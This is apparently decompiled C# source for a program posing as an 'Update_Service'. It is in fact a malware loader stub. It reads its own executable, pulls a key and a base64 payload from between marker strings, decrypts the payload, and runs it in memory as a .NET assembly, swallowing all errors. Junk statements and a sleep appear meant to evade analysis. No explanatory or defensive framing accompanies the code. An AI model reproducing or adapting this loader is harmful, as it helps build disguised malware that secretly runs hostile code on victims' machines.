using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using upd;

namespace Update_Service;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		"operation failed".Contains("failed");
		if (Counter.rsd.Next(1, 2) == 1)
		{
			Counter.errors();
		}
		else
		{
			Counter.we();
		}
		Thread.Sleep(1213);
	}

	public static int InfoUpd()
	{
		try
		{
			string input = File.ReadAllText(Assembly.GetEntryAssembly()!.Location);
			byte[] bytes = Encoding.ASCII.GetBytes(new Regex("ghjghjbnv.*ghjghjbnv").Matches(input)[0].Value.Replace("ghjghjbnv", ""));
			Assembly.Load(Helper.dfsfupd(Convert.FromBase64String(Regex.Split(input, "ghjghjbnv")[2]), bytes)).EntryPoint!.Invoke(null, new object[1] { new string[0] });
		}
		catch (Exception)
		{
		}
		return 45;
	}
}
